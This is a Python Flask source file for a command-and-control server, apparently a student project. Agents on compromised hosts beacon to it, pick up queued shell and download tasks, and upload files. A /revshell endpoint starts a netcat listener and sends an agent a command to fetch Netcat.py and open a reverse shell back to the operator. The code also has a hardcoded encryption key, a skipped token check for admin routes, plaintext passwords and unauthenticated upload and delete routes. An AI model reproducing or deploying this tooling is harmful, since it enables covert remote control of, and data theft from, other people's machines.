import os
import json
import subprocess
import uuid
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from datetime import datetime, timezone ,timedelta
import sqlite3
from flask import g
import secrets
from functools import wraps
import logging
import sys
import threading
import time
import folium
import requests
import plotly.graph_objects as go
import pandas as pd
from collections import Counter
app = Flask(__name__)
load_dotenv()
# Configure Flaks terminal colors Correctly
G = "\033[92m"  # Green (2xx)
B = "\033[94m"  # Blue (3xx)
R = "\033[91m"  # Red (4xx & 5xx)
W = "\033[0m"  # White/Reset


class StatusFormatter(logging.Formatter):
    def format(self, record):
        msg = super().format(record)

        # Color logic based on status code patterns
        if " 200 " in msg or " 201 " in msg:
            return f"{G}{msg}{W}"
        elif any(code in msg for code in [" 301 ", " 302 ", " 304 "]):
            return f"{B}{msg}{W}"
        elif any(err in msg for err in [" 400 ", " 404 ", " 500 ", " 503 "]):
            return f"{R}{msg}{W}"

        return msg


# Configure the Werkzeug logger
handler = logging.StreamHandler(sys.stdout)  # Redirects stderr to stdout
handler.setFormatter(StatusFormatter())

werk_log = logging.getLogger('werkzeug')
werk_log.setLevel(logging.INFO)
werk_log.handlers = [handler]
werk_log.propagate = False


# --- Configuration ---
IP = "192.168.1.41"
PORT = 5000
UPLOAD_FOLDER = "./upload"
API_KEY = os.getenv("API_KEY")
DATABASE = "c2.db"
SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
cipher = Fernet(SECRET_KEY)

#Folders & Directories
UPLOAD_FOLDER = 'upload'
PLUGINS_DIR = "./plugins"
TOOLS_FOLDER = "tools"
os.makedirs(PLUGINS_DIR, exist_ok=True)
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['TOOLS_FOLDER'] = TOOLS_FOLDER
app.secret_key = SECRET_KEY


# --- Encryption functions ---
def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()

def decrypt_data(data):
    return cipher.decrypt(data.encode()).decode()


# ---  Connecting to SQLite DB ---
def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(exception):
    db = g.pop("db", None)
    if db is not None:
        db.close()
    if exception:
        app.logger.error(f"Context torn down due to error: {exception}")

#Token Handling
def require_token(role=None):  #  accepts role
    def wrapper(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            #  If role is admin, skip token check entirely
            if role == "admin":
                request.agent_id = None
                request.role = "admin"
                return f(*args, **kwargs)

            token = request.headers.get("TOKEN")

            if not token:
                return jsonify({"error": "Missing token"}), 401

            db = get_db()

            row = db.execute("""
                SELECT t.agent_id, t.expiry, u.role
                FROM tokens t
                JOIN users u ON t.username = u.username
                WHERE t.token = ?
            """, (token,)).fetchone()

            if not row:
                return jsonify({"error": "Invalid token"}), 403

            if datetime.fromisoformat(row["expiry"]) < datetime.utcnow():
                return jsonify({"error": "Token expired"}), 403

            # Role enforcement
            if role and row["role"] != role:
                return jsonify({"error": "Forbidden"}), 403

            request.agent_id = row["agent_id"]
            request.role = row["role"]

            return f(*args, **kwargs)

        return decorated
    return wrapper


# --- Agent beacon endpoint ---
@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    beacon_info = json.loads(decrypted_json)
    agent_id = beacon_info.get("id")

    db = get_db()
    db.execute("""
        INSERT INTO agents (id, hostname, user, os, ip, last_seen)
        VALUES (?, ?, ?, ?, ?, datetime('now'))
        ON CONFLICT(id) DO UPDATE SET
            hostname=excluded.hostname,
            user=excluded.user,
            os=excluded.os,
            ip=excluded.ip,
            last_seen=datetime('now')
    """, (
        agent_id,
        beacon_info.get("hostname"),
        beacon_info.get("user"),
        beacon_info.get("os"),
        request.remote_addr
    ))
    db.commit()

    # Fetch pending task
    task = db.execute("""
        SELECT uuid, task_json ,scheduled_at FROM tasks
        WHERE agent_id = ? AND output IS NULL
    """, (agent_id,)).fetchall()

    if task:
        formatted_tasks = [
            {
                "task": json.loads(row["task_json"]),
                "uuid": row["uuid"],
                "scheduled_at": row["scheduled_at"]
            }
            for row in task
        ]
        print("formatted tasks:", formatted_tasks)
        return formatted_tasks

    return []

# --- Live agents API ---
AGENT_ONLINE_TIMEOUT = 30  # seconds

@app.route("/agents-data")
@require_token(role="admin")
def agents_data():
    now = datetime.now(timezone.utc)

    db = get_db()
    rows = db.execute("SELECT * FROM agents").fetchall()

    data = []
    for row in rows:
        last_seen = datetime.fromisoformat(row["last_seen"])

        # FIX: ensure timezone-aware
        if last_seen.tzinfo is None:
            last_seen = last_seen.replace(tzinfo=timezone.utc)

        online = (now - last_seen).total_seconds() <= AGENT_ONLINE_TIMEOUT

        data.append({
            "id": row["id"],
            "hostname": row["hostname"],
            "user": row["user"],
            "os": row["os"],
            "ip": row["ip"],
            "last_seen": last_seen.timestamp(),
            "online": online
        })

    return jsonify(data)


# --- Agents page ---
@app.route('/agents/')
@require_token(role="admin")
def agents_list():
    if "username" not in session:
        return redirect(url_for("login"))

    now = datetime.now(timezone.utc)
    agent_rows = []

    db = get_db()
    agents = db.execute("SELECT * FROM agents").fetchall()

    for agent in agents:
        last_seen = datetime.fromisoformat(agent["last_seen"])

        # Ensure timezone-aware
        if last_seen.tzinfo is None:
            last_seen = last_seen.replace(tzinfo=timezone.utc)

        online = (now - last_seen).total_seconds() <= AGENT_ONLINE_TIMEOUT

        pending_tasks = db.execute("""
            SELECT COUNT(*) FROM tasks
            WHERE agent_id = ? AND output IS NULL
        """, (agent["id"],)).fetchone()[0]

        agent_rows.append({
            "id": agent["id"],
            "status": "online" if online else "offline",
            "last_seen": last_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "pending_tasks": pending_tasks
        })

    return render_template('agents.html', agents=agent_rows)


# --- Agent detail page ---
@app.route('/agents/<agent_id>')
@require_token(role="admin")
def agent_detail(agent_id):
    if "username" not in session:
        return redirect(url_for("login"))

    db = get_db()

    # Fetch all tasks for this agent
    tasks = db.execute("""
        SELECT uuid, task_json, output
        FROM tasks
        WHERE agent_id = ?
        ORDER BY rowid DESC
    """, (agent_id,)).fetchall()

    task_rows = []
    for t in tasks:
        task_rows.append({
            "uuid": t["uuid"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        })

    return render_template('agent_detail.html', agent_id=agent_id, tasks=task_rows)

#Agent Creation Via API
@app.route('/agent-create', methods=['POST'])
@require_token(role="admin")
def agent_create():
    username = request.json.get("username")
    password = request.json.get("password")
    id_number = request.json.get("id")
    print(username, password, id_number)
    db = get_db()
    existing_username = db.execute(
        "SELECT 1 FROM USERS WHERE username = ?",
        (username,)
    ).fetchone()
    print(existing_username)
    existing_agentid = db.execute(
        "SELECT 1 FROM AGENTS WHERE ID = ?",
        (id_number,)
    ).fetchone()
    print(existing_agentid)
    if existing_agentid:
        return {"error": "AgentID already exists"}, 400
    if existing_username:
        return {"error": "Username already exists"}, 400


    db.execute(
        "INSERT INTO USERS (username, password, role) VALUES (?, ?, ?)",
        (username, password, "agent")
    )
    db.commit()
    with open("Agent2.py", "r") as f_in, open(f"Agent{id_number}.py", "w") as f_out:
        lines = f_in.readlines()

        lines[22] = f'username = "{username}"\n'
        lines[23] = f'password = "{password}"\n'
        lines[28] = f'AGENT_ID = "{id_number}"\n'

        f_out.writelines(lines)
    #return jsonify({f"AGENT{id_number}": "created"}) ,200
    return {"success": "created"} ,200

# --- Agent result endpoint ---
@app.route('/result', methods=['POST'])
def result():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    result_info = json.loads(decrypted_json)

    task_uuid = result_info.get("uuid")
    output = result_info.get("output")
    executed_at = result_info.get("executed_at")
    db = get_db()
    db.execute("""
        UPDATE tasks SET output = ? , executed_at = ? WHERE uuid = ?
    """, (output, executed_at,task_uuid))
    db.commit()

    return jsonify({"status": "received"})

# --- Add a task ---
@app.route('/task', methods=['POST'])
@require_token(role="admin")
def add_task():
    auth_header = request.headers.get("Authorization")
    if auth_header != f"Bearer {API_KEY}":
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json()
    agent_id = data.get("id")
    command = data.get("task")
    scheduled_at = data.get("scheduled_at")
    recurring_every = data.get("recurring_every")

    if recurring_every is None:
        recurring_every = "N/A"

    task_uuid = str(uuid.uuid4())

    db = get_db()
    db.execute("""
        INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
        VALUES (?, ?, ?, NULL, ?, ?)
    """, (task_uuid, agent_id, json.dumps(command),scheduled_at,recurring_every))
    db.commit()
    if recurring_every and recurring_every != "N/A":
        print("initiating recurring task")
        print("scheduled_at", scheduled_at)
        thread = threading.Thread(
        target=recurring_scheduler, args=(task_uuid, recurring_every, agent_id, command),daemon=True)
        thread.start()
    print("waiting for task")
    return jsonify({"status": "accepted", "uuid": task_uuid})


def recurring_scheduler(task_uuid,recurring_every,agent_id,command):
    minutes = int(recurring_every)
    seconds = minutes * 60
    time.sleep(seconds)
    with app.app_context():
        while True:
            # 1. Wait first

            # 2. Open a NEW connection for this specific cycle
            # This prevents "Closed Database" and "Thread Sharing" errors
            try:
                # Connect directly using the path to your .db file
                conn = sqlite3.connect('c2.db')
                db = conn.cursor()

                new_uuid = str(uuid.uuid4())
                current_time = datetime.now(timezone.utc)

                db.execute("""
                                SELECT uuid, agent_id, task_json, recurring_every ,output
                                FROM tasks 
                                WHERE recurring_every IS NOT NULL 
                                  AND recurring_every != 'N/A' 
                                  AND recurring_every > 0
                                  AND output IS NULL""")
                task = db.fetchone()
                if task:

                    db.execute("""
                            INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
                            VALUES (?, ?, ?, NULL, ?, NULL)
                        """, (new_uuid, agent_id, json.dumps(command), current_time))
                    print(f"Successfully executed recurring task: {new_uuid}")

                conn.commit()
                conn.close()  # Always close it so you don't leak connections


                time.sleep(seconds)
            except Exception as e:
                print(f"Error in recurring_scheduler loop: {e}")


def restart_recurring_tasks(app):
    """Finds all recurring tasks in the DB and starts their threads."""
    print("starting recurring tasks")
    with app.app_context():
        try:
            conn = sqlite3.connect("c2.db")
            db = conn.cursor()

            # Find tasks that have a recurring interval
            db.execute("""
                            SELECT uuid, agent_id, task_json, recurring_every ,output
                            FROM tasks 
                            WHERE recurring_every IS NOT NULL 
                              AND recurring_every != 'N/A' 
                              AND recurring_every > 0
                              AND output IS NULL""")
            tasks = db.fetchall()
            conn.close()

            if not tasks:
                print("No recurring tasks found to resume.")
                return

            for task in tasks:
                task_uuid, agent_id, task_json, recurring_every, output= task
                command = json.loads(task_json)  # Convert string back to dict

                print(f"Resuming recurring task: {task_uuid} every {recurring_every}m")

                # Call your existing scheduler function in a new thread
                thread = threading.Thread(
                    target=recurring_scheduler,
                    args=(task_uuid, recurring_every, agent_id, command),
                    daemon=True
                )
                thread.start()

        except Exception as e:
            print(f"Error resuming tasks: {e}")

# --- File upload ---
@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    return f'[+] File {file.filename} successfully uploaded', 200

# Uploaded File Index
@app.route('/uploads/<filename>', methods=['GET', 'DELETE'])
def uploaded_file(filename):
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)

    if request.method == 'GET':
        # Serve file
        return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

    elif request.method == 'DELETE':
        # Optionally check authorization/session here
        if not os.path.exists(file_path):
            return jsonify({"error": "File not found"}), 404

        try:
            os.remove(file_path)
            return jsonify({"message": "File deleted successfully"})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

@app.route("/files-data")
def files_data():
    files = os.listdir(app.config["UPLOAD_FOLDER"])
    return jsonify(files)

# Uploads
@app.route('/uploads/')
@require_token(role="admin")
def uploads_list():
    if "username" not in session:
        return redirect(url_for("login"))
    files = [f for f in os.listdir(app.config['UPLOAD_FOLDER']) if os.path.isfile(os.path.join(app.config['UPLOAD_FOLDER'], f))]
    return render_template("uploads.html", files=files)

# Plugins
@app.route('/plugins/')
@require_token(role="admin")
def plugins_list():
    if "username" not in session:
        return redirect(url_for("login"))
    plugins = [f for f in os.listdir(PLUGINS_DIR) if f.endswith(".py")]
    return render_template("plugins.html", plugins=plugins)

# Plugin file Index
@app.route("/plugins/<filename>")
@require_token(role="admin")
def serve_plugin(filename):
    # Only allow .py files
    if not filename.endswith(".py"):
        return "Invalid file", 400
    return send_from_directory(PLUGINS_DIR, filename)

# Plugin run functionality
@app.route('/plugins/run', methods=['POST'])
def run_plugin():
    if "username" not in session:
        return redirect(url_for("login"))

    agent_id = request.form.get("agent_id")
    plugin_name = request.form.get("plugin_name")
    if not agent_id or not plugin_name:
        return "Missing parameters", 400

    # Construct the plugin URL that agent will download
    #plugin_url = f"{request.host_url}plugins/{plugin_name}"
    plugin_url = "http://{IP}:{PORT}/plugins/{plugin_name}".format(IP=IP,PORT=PORT,plugin_name=plugin_name)
    # Insert task into tasks table
    task_uuid = str(uuid.uuid4())
    db = get_db()
    current_time = datetime.now(timezone.utc)
    db.execute("""
        INSERT INTO tasks (uuid, agent_id, task_json, output,scheduled_at)
        VALUES (?, ?, ?, NULL,?)
    """, (task_uuid, agent_id, json.dumps({"type": "download", "url": plugin_url}),current_time))
    db.commit()

    return redirect(url_for('plugins_list'))

# --- Login / Logout ---
@app.route("/login", methods=["GET", "POST"])
def login():
    db = get_db()
    db.execute("DELETE FROM tokens WHERE expiry < ?", (datetime.now(timezone.utc).isoformat(),))
    db.commit()

    # -------------------------
    # HANDLE POST (BOTH JSON + FORM)
    # -------------------------
    if request.method == "POST":

        # Detect input type
        if request.is_json:
            data = request.get_json(silent=True) or {}
            username = data.get("username")
            password = data.get("password")
            agent_id = data.get("agent_id")
            is_api = True
        else:
            username = request.form.get("username")
            password = request.form.get("password")
            agent_id = None
            is_api = False

        # -------------------------
        # Validate user
        # -------------------------
        row = db.execute(
            "SELECT password, role FROM users WHERE username = ?",
            (username,)
        ).fetchone()

        if not row or row["password"] != password:
            if is_api:
                return jsonify({"error": "Unauthorized"}), 401
            return render_template("login.html", error="Invalid credentials")

        role = row["role"]

        # -------------------------
        # ADMIN (Dashboard Login)
        # -------------------------
        if not is_api:
            if role != "admin":
                return render_template("login.html", error="Access denied")

            session["username"] = username
            session["role"] = role

            return redirect(url_for("dashboard"))

        # -------------------------
        # API LOGIN (Agent or Admin API)
        # -------------------------

        token = secrets.token_hex(32)
        expiry = datetime.utcnow() + timedelta(days=7)

        # If agent_id provided → treat as agent
        if agent_id:
            db.execute("DELETE FROM tokens WHERE agent_id = ?", (agent_id,))
            agent = db.execute(
                "SELECT id FROM agents WHERE id = ?",
                (agent_id,)
            ).fetchone()

            if not agent:
                db.execute(
                    """INSERT INTO agents (id, hostname, user, os, ip, last_seen)
                       VALUES (?, ?, ?, ?, ?, ?)""",
                    (
                        agent_id,
                        data.get("hostname"),
                        data.get("user"),
                        data.get("os"),
                        request.remote_addr,
                        datetime.utcnow().isoformat()
                    )
                )
            else:
                db.execute(
                    "UPDATE agents SET last_seen = ?, ip = ? WHERE id = ?",
                    (datetime.utcnow().isoformat(), request.remote_addr, agent_id)
                )

        # Store token with role awareness
        db.execute(
            "INSERT INTO tokens (token, agent_id, expiry, username) VALUES (?, ?, ?, ?)",
            (token, agent_id, expiry.isoformat(), username)
        )


        db.commit()

        return jsonify({
            "status": "ok",
            "token": token,
            "role": role,
            "expires": expiry.isoformat()
        }), 200

    # -------------------------
    # GET → login page
    # -------------------------
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("username", None)
    return redirect(url_for("login"))

# Getting the Geolocation of an IP from ip-api.com
def get_location(ip):
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url)
    data = response.json()

    if data['status'] == 'success':
        return data['lat'], data['lon'], data['city'], data['country']
    else:
        return None

def tasks_analytics(agent_id):
    db = get_db()
    total_agent_tasks = db.execute(
        "SELECT executed_at FROM tasks WHERE agent_id = ?", (agent_id,)
    ).fetchall()

    timestamps = [task[0] for task in total_agent_tasks]
    dates_only = [ts.split(" ")[0] for ts in timestamps]

    date_counts = dict(Counter(dates_only))
    return date_counts


def chart():
    db = get_db()
    # Get all agent IDs
    agents = db.execute("SELECT id FROM agents").fetchall()
    agents = [row[0] for row in agents]

    # Collect all dates across all agents
    all_dates_set = set()
    agent_date_counts = {}

    for agent_id in agents:
        counts = tasks_analytics(agent_id)
        agent_date_counts[agent_id] = counts
        all_dates_set.update(counts.keys())

    # Sort all dates
    all_dates = sorted(all_dates_set)

    # Create Plotly figure
    fig = go.Figure()

    for agent_id in agents:
        counts = [agent_date_counts[agent_id].get(date, 0) for date in all_dates]
        fig.add_trace(go.Bar(
            x=all_dates,
            y=counts,
            name=f"Agent {agent_id}"  # use agent ID in legend
        ))

    # Layout with dark theme
    fig.update_layout(
        title="",
        xaxis_title="Date",
        yaxis_title="Number of Tasks",
        template="plotly_dark",
        plot_bgcolor="rgba(30,41,59,0.85)",
        paper_bgcolor="rgba(30,41,59,0.85)",
        font_color="#e5e7eb",
        xaxis=dict(gridcolor="rgba(148,163,184,0.15)"),
        yaxis=dict(gridcolor="rgba(148,163,184,0.15)"),
        barmode="group",  # bars for each agent side by side
        margin=dict(l=20, r=20, t=40, b=20)
    )

    chart_html = fig.to_html(full_html=False)
    return chart_html

@app.route("/info")
@require_token(role="admin")
def info():
    if "username" not in session:
        return redirect(url_for("login"))
    ips =['8.8.8.8']
    db = get_db()
    agent_ip = db.execute("SELECT IP FROM agents").fetchall()
    for row in agent_ip:
        ips.append(row[0])

    # Create base map
    m = folium.Map(location=[20, 0], zoom_start=2)

    for ip in ips:
        ip_result = get_location(ip)
        if ip_result:
            lat, lon, city, country = ip_result

            folium.Marker(
                location=[lat, lon],
                popup=f"{ip} - {city}, {country}"
            ).add_to(m)
        map_html = m._repr_html_()  # key line
        chart_html = chart()

    # Save map
    #m.save("ip_map.html")
    return render_template("info.html",map=map_html,chart_html=chart_html)






# --- Dashboard ---
@app.route("/dashboard")
@require_token(role="admin")
def dashboard():
    if "username" not in session:
        return redirect(url_for("login"))

    db = get_db()

    files = os.listdir(app.config['UPLOAD_FOLDER'])

    task_rows = db.execute("""
        SELECT uuid, agent_id, task_json, output
        FROM tasks
        ORDER BY rowid DESC
    """).fetchall()

    tasks_str = {}
    for t in task_rows:
        tasks_str[str(t["uuid"])] = {
            "agent_id": t["agent_id"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        }

    agents_db = db.execute("SELECT * FROM agents").fetchall()

    now = datetime.now(timezone.utc)
    agent_rows = []

    for agent in agents_db:
        last_seen_dt = datetime.fromisoformat(agent["last_seen"])

        # Ensure timezone-aware
        if last_seen_dt.tzinfo is None:
            last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)

        online = (now - last_seen_dt).total_seconds() <= AGENT_ONLINE_TIMEOUT

        agent_rows.append({
            "id": agent["id"],
            "hostname": agent["hostname"],
            "user": agent["user"],
            "os": agent["os"],
            "ip": agent["ip"],
            "last_seen": last_seen_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "status": "online" if online else "offline"
        })

    return render_template(
        "dashboard.html",
        files=files,
        api_key=API_KEY,
        agents=agent_rows,
        tasks=tasks_str
    )
# --- Tasks endpoints ---
@app.route("/tasks-data")
@require_token(role="admin")
def tasks_data():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401

    db = get_db()

    rows = db.execute("""
        SELECT uuid, agent_id, task_json, output ,executed_at,scheduled_at,recurring_every
        FROM tasks
        ORDER BY rowid DESC
    """).fetchall()

    tasks_dict = {}
    for t in rows:

        if t["scheduled_at"] is None:
            formatted_data = "N/A"
        else:
            iso_string = str(t["scheduled_at"]).replace("Z", "+00:00")

            dt_object = datetime.fromisoformat(iso_string)
            formatted_data = dt_object.strftime("%#m/%#d/%Y, %#I:%M:%S %p")

        if t["recurring_every"] is None:
            rec = "N/A"
        else:
            rec=t["recurring_every"]

        tasks_dict[str(t["uuid"])] = {
            "agent_id": t["agent_id"],
            "task": json.loads(t["task_json"]),
            "output": t["output"],
            "executed_at": t["executed_at"],
            "scheduled_at": formatted_data,
            "recurring_every": rec,
        }


    return jsonify(tasks_dict)

@app.route('/tasks/')
@require_token(role="admin")
def tasks_list():
    if "username" not in session:
        return redirect(url_for("login"))

    db = get_db()
    rows = db.execute("""
        SELECT uuid, agent_id, task_json, output
        FROM tasks
        ORDER BY rowid DESC
    """).fetchall()

    tasks_str = {}
    for t in rows:
        tasks_str[str(t["uuid"])] = {
            "agent_id": t["agent_id"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        }

    # Pass API_KEY to template
    return render_template('tasks.html', tasks=tasks_str, api_key=API_KEY)

# Task Delete
@app.route('/tasks/<task_uuid>', methods=['DELETE'])
@require_token(role="admin")
def delete_task(task_uuid):
    auth_header = request.headers.get("Authorization")
    if auth_header != f"Bearer {API_KEY}":
        return jsonify({"error": "Unauthorized"}), 401

    db = get_db()
    db.execute("DELETE FROM tasks WHERE uuid = ?", (task_uuid,))
    db.commit()
    return jsonify({"status": "deleted"})

@app.route('/tools/<filename>')
def tools_file(filename):
    return send_from_directory(app.config['TOOLS_FOLDER'], filename)

@app.route('/revshell',methods=['POST'])
def revshell():
    #Gets request from browser
    netcat_url = f"http://{IP}:{PORT}/tools/Netcat.py"
    agent_id = request.json.get("agent_id")
    port = request.json.get("port")
    task_uuid = str(uuid.uuid4())
    current_time = datetime.now(timezone.utc)
    print(agent_id)
    print(port)
    if port and agent_id:
        db = get_db()
        db.execute("""
            INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
            VALUES (?, ?, ?, NULL, ?, NULL)
        """, (task_uuid, agent_id, json.dumps({"type": "download", "url": netcat_url}),current_time))
        db.commit()
    else:
        return jsonify({"Error": "Missing Parameters"}), 401
    rev_dir = r"C:\Users\USER\PycharmProjects\Grad\tools\Netcat.py"
    rev_cmd = f'py "{rev_dir}" -l -p {port}'

    # Use start cmd to open new terminal window
    subprocess.Popen(
        f'start cmd /k "{rev_cmd}"',
        shell=True
    )
    time.sleep(3)
    task_uuid = str(uuid.uuid4())
    db = get_db()

    db.execute("""
        INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
        VALUES (?, ?, ?, NULL, ?, NULL)
    """, (task_uuid, agent_id, json.dumps({"type": "shell", "command": f"python3 Netcat.py -t {IP} -p {port}"}),current_time))
    db.commit()
    return jsonify({"status": "executed"})
# --- Main ---
if __name__ == "__main__":
    restart_recurring_tasks(app)
    app.run(host="0.0.0.0", port=PORT,use_reloader=False)